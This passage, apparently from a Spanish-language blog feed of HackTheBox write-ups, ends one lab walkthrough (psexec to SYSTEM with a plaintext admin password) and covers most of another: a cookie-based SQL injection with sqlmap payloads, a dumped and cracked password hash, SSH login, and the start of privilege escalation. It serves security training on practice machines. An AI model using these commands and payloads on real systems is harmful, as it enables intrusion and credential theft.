  <li>Podemos ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-psexec cascade.local/administrator:<span class="s1">'baCT3r1aN00dles'</span>@10.10.10.182
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.182.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file DMBizKaJ.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.182.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service HMRm on 10.10.10.182.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service HMRm.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 6.1.7601]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
144f061bdfde9e97418da481e7228dba
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Shared (medium)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html" rel="alternate" type="text/html" title="HackTheBox - Shared (medium)" /><published>2024-05-26T00:00:00-06:00</published><updated>2024-05-26T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/bf928375e067672d42a572d81684537b.png" />
</p>

<ul>
  <li>Shared is a Medium Difficulty Linux machine that features a Cookie SQL Injection leading to a foothold, which is then used to escalate privileges by reverse engineering a Golang binary and leveraging two CVEs to gain a root shell.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos con el escaneo de puertos y servicios abiertos por el protocolo <strong>TCP</strong> en la maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,443 10.10.11.172 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-26 12:59 CST
Nmap scan report <span class="k">for </span>10.10.11.172
Host is up <span class="o">(</span>0.092s latency<span class="o">)</span><span class="nb">.</span>

PORT	STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 <span class="o">(</span>RSA<span class="o">)</span>
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span><span class="k">*</span>.shared.htb/organizationName<span class="o">=</span>HTB/stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
|_http-title: Did not follow redirect to https://shared.htb
| tls-nextprotoneg:
|   h2
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Ahora agregamos el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.172 shared.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.172 shared.htb
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/1.png" />
</p>

<ul>
  <li>
    <p>Es una tienda vamos agregar una producto al carrito.</p>
  </li>
  <li>
    <p>Si le damos en procesar el pedido vemos que nos redirige a otro subdominio.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/2.png" />
</p>

<ul>
  <li>
    <p>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
  </li>
  <li>
    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Proceed to checkout</code> nos lleva al subdominio.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/3.png" />
</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li>Si ponemos datos cualquiera como input vemos que solo nos dice que el pago se realizo con éxito.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/4.png" />
</p>

<ul>
  <li>Vemos que se están empleando <code class="language-plaintext highlighter-rouge">cookies</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/5.png" />
</p>

<ul>
  <li>Vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">Burpsuite</code> en el momento en el que demos <code class="language-plaintext highlighter-rouge">click</code> ala hora de darle en <code class="language-plaintext highlighter-rouge">proceed to checkout</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/6.png" />
</p>

<ul>
  <li>Si <code class="language-plaintext highlighter-rouge">urldecodiamos</code> la parte de la <code class="language-plaintext highlighter-rouge">cookie</code> vemos los datos que nos muestra a la hora de pagar.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/7.png" />
</p>

<ul>
  <li>Si cambiamos el numero vemos que se refleja.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/8.png" />
</p>

<ul>
  <li>Si aplicamos una inyección <code class="language-plaintext highlighter-rouge">sql</code> para hacer un ordenamiento basándonos en la 3 columna vemos no nos da ningún error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/9.png" />
</p>

<ul>
  <li>
    <p>Ahora bueno si cambiamos de numero nos da error a si que con esto sabemos que hay 3 columnas con esto ya podemos aplicar un <code class="language-plaintext highlighter-rouge">union select</code> para las 3 columnas, lo que debemos hacer es probar en algún campo para ver si se refleja nuestro output para ver el nombre de la base de datos actualmente en uso.</p>
  </li>
  <li>
    <p>Pero como tal no nos deja hasta que cambiemos la parte del <code class="language-plaintext highlighter-rouge">product</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/10.png" />
</p>

<ul>
  <li>También podemos escribir en el campo 3.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/11.png" />
</p>

<ul>
  <li>Ahora podemos listar las bases de datos existentes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/12.png" />
</p>

<ul>
  <li>Ahora vamos a enumerar las tablas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/13.png" />
</p>

<ul>
  <li>Ahora enumeramos las columnas para la tabla <code class="language-plaintext highlighter-rouge">user</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/14.png" />
</p>

<ul>
  <li>Ahora vemos el contenido de las tablas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/15.png" />
</p>

<ul>
  <li>También lo pudimos haber hecho con <code class="language-plaintext highlighter-rouge">sqlmap</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span>
        ___
       __H__
 ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[)]</span>     | .<span class="s1">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:30:00 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:30:02] <span class="o">[</span>INFO] testing connection to the target URL
<span class="o">[</span>13:30:03] <span class="o">[</span>INFO] checking <span class="k">if </span>the target is protected by some kind of WAF/IPS
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:30:03] <span class="o">[</span>WARNING] heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test </span>shows that <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> might not be injectable
<span class="o">[</span>13:30:04] <span class="o">[</span>INFO] testing <span class="k">for </span>SQL injection on <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span>
<span class="o">[</span>13:30:04] <span class="o">[</span>INFO] testing <span class="s1">'Generic UNION query (NULL) - 3 to 3 columns (custom)'</span>
<span class="o">[</span>13:30:04] <span class="o">[</span>WARNING] applying generic concatenation <span class="o">(</span>CONCAT<span class="o">)</span>
injection not exploitable with NULL values. Do you want to try with a random integer value <span class="k">for </span>option <span class="s1">'--union-char'</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:30:11] <span class="o">[</span>WARNING] <span class="k">if </span>UNION based SQL injection is not detected, please consider forcing the back-end DBMS <span class="o">(</span>e.g. <span class="s1">'--dbms=mysql'</span><span class="o">)</span>
Deleting temporary files - please <span class="nb">wait</span> ... <span class="k">done</span><span class="nb">.</span>
<span class="o">[</span>13:30:19] <span class="o">[</span>INFO] <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is <span class="s1">'Generic UNION query (NULL) - 3 to 3 columns (custom)'</span> injectable
<span class="o">[</span>13:30:19] <span class="o">[</span>INFO] checking <span class="k">if </span>the injection point on <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is a <span class="nb">false </span>positive
<span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 58 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:30:20] <span class="o">[</span>INFO] testing MySQL
<span class="o">[</span>13:30:21] <span class="o">[</span>INFO] confirming MySQL
<span class="o">[</span>13:30:22] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL <span class="o">&gt;=</span> 5.0.0 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:30:22] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:30:22 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>Ahora enumeramos las bases de datos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">--dbs</span>
        ___
       __H__
 ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span>.]     | .<span class="s1">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:31:11 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] testing connection to the target URL
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] fetching database names
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
available databases <span class="o">[</span>2]:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> checkout
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema

<span class="o">[</span>13:31:13] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:31:13 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>Ahora las tablas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">-D</span> checkout <span class="nt">--tables</span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span><span class="s2">"]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:31:48 /2024-05-26/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:31:48] [INFO] resuming back-end DBMS 'mysql'
[13:31:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns (custom)
    Payload: custom_cart={"</span><span class="s1">' UNION ALL SELECT NULL,CONCAT(CONCAT('</span>qzbxq<span class="s1">','</span>mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp<span class="s1">'),'</span>qvbkq<span class="s1">'),NULL-- qbYb":"1"}
---
[13:31:49] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork)
[13:31:49] [INFO] fetching tables for database: '</span>checkout<span class="s1">'
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
Database: checkout
[2 tables]
+---------+
| user    |
| product |
+---------+

[13:31:49] [INFO] fetched data logged to text files under '</span>/home/miguel/.local/share/sqlmap/output/checkout.shared.htb<span class="s1">'

[*] ending @ 13:31:49 /2024-05-26/
</span></code></pre></div></div>

<ul>
  <li>Ahora vemos el <code class="language-plaintext highlighter-rouge">hash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">-D</span> checkout <span class="nt">-T</span> user <span class="nt">--dump</span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[(]</span>     | .<span class="s1">'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:32:24 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:32:24] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span>
<span class="o">[</span>13:32:24] <span class="o">[</span>INFO] testing connection to the target URL
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] fetching columns <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'checkout'</span>
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] fetching entries <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'checkout'</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] recognized possible password hashes <span class="k">in </span>column <span class="s1">'password'</span>
<span class="k">do </span>you want to store hashes to a temporary file <span class="k">for </span>eventual further processing with other tools <span class="o">[</span>y/N] N
<span class="k">do </span>you want to crack them via a dictionary-based attack? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] using <span class="nb">hash </span>method <span class="s1">'md5_generic_passwd'</span>
what dictionary <span class="k">do </span>you want to use?
<span class="o">[</span>1] default dictionary file <span class="s1">'/usr/share/sqlmap/data/txt/wordlist.tx_'</span> <span class="o">(</span>press Enter<span class="o">)</span>
<span class="o">[</span>2] custom dictionary file
<span class="o">[</span>3] file with list of dictionary files
<span class="o">&gt;</span> 1
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] using default dictionary
<span class="k">do </span>you want to use common password suffixes? <span class="o">(</span>slow!<span class="o">)</span> <span class="o">[</span>y/N] N
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] starting dictionary-based cracking <span class="o">(</span>md5_generic_passwd<span class="o">)</span>
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] starting 2 processes
<span class="o">[</span>13:33:05] <span class="o">[</span>WARNING] no clear password<span class="o">(</span>s<span class="o">)</span> found
Database: checkout
Table: user
<span class="o">[</span>1 entry]
+----+----------------------------------+-------------+
| <span class="nb">id</span> | password                         | username    |
+----+----------------------------------+-------------+
| 1  | fc895d4eddc2fc12f995e18c865cf273 | james_mason |
+----+----------------------------------+-------------+

<span class="o">[</span>13:33:05] <span class="o">[</span>INFO] table <span class="s1">'checkout.`user`'</span> dumped to CSV file <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb/dump/checkout/user.csv'</span>
<span class="o">[</span>13:33:05] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:33:05 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>También podemos hacer un script en <code class="language-plaintext highlighter-rouge">python3</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 exploit.py
james_mason:fc895d4eddc2fc12f995e18c865cf273
Hash guardado en <span class="s1">'hash.txt'</span>
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 512/512 AVX512BW 16x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Press Ctrl-C to abort, or send SIGUSR1 to john process <span class="k">for </span>status
Soleil101        <span class="o">(</span>james_mason<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2024-05-26 13:45<span class="o">)</span> 2.000g/s 4182Kp/s 4182Kc/s 4182KC/s Sportster1..Sjoerd
Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
Session completed.
0 password hashes cracked, 2 left
</code></pre></div></div>

<ul>
  <li>Aquí pueden ver el script <a href="https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Shared/exploit.py">https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Shared/exploit.py</a> .</li>
</ul>

<h2 id="shell-as-james_mason">Shell as james_mason</h2>

<ul>
  <li>Ahora nos conectamos por <code class="language-plaintext highlighter-rouge">ssh</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ssh james_mason@10.10.11.172
The authenticity of host <span class="s1">'10.10.11.172 (10.10.11.172)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:UXHSnbXewSQjJVOjGF5RVNToyJZqtdQyS8hgr5P8pWM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.172<span class="s1">' (ED25519) to the list of known hosts.
james_mason@10.10.11.172'</span>s password:
Linux shared 5.10.0-16-amd64 <span class="c">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>Hay otro usuario a nivel de sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total 16
drwxr-xr-x  4 root        root        4096 Jul 14  2022 <span class="nb">.</span>
drwxr-xr-x 18 root        root        4096 Jul 14  2022 ..
drwxr-xr-x  4 dan_smith   dan_smith   4096 Jul 14  2022 dan_smith
drwxr-xr-x  2 james_mason james_mason 4096 Jul 14  2022 james_mason
james_mason@shared:/home<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">developer</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/home<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span>,1001<span class="o">(</span>developer<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Hay una carpeta la cual esta como grupo asignado <code class="language-plaintext highlighter-rouge">developer</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/home<span class="nv">$ </span>find / <span class="nt">-group</span> developer 2&gt;/dev/null
/opt/scripts_review
</code></pre></div></div>

<ul>
  <li>Tenemos capacidad de escritura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">touch </span>zi
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 8
drwxrwx--- 2 root        developer   4096 May 26 15:53 <span class="nb">.</span>
drwxr-xr-x 3 root        root        4096 Jul 14  2022 ..
<span class="nt">-rw-r--r--</span> 1 james_mason james_mason    0 May 26 15:53 zi
</code></pre></div></div>

<ul>
  <li>Pero bueno poca cosa vamos a hacer vamos a usar <code class="language-plaintext highlighter-rouge">pspy</code> para ver tareas que se estén ejecutando en el sistema <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/16.png" />
</p>

<ul>
  <li>
    <p>Ahora lo ejecutamos.</p>
  </li>
  <li>
    <p>Esta usando <code class="language-plaintext highlighter-rouge">ipython</code> y se mete ala ruta donde estábamos <a href="https://es.wikipedia.org/wiki/IPython">https://es.wikipedia.org/wiki/IPython</a>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/17.png" />
</p>

<ul>
  <li>
    <p>Si investigamos encontramos como podemos abusar de <code class="language-plaintext highlighter-rouge">ipython</code> <a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a>.</p>
  </li>
  <li>
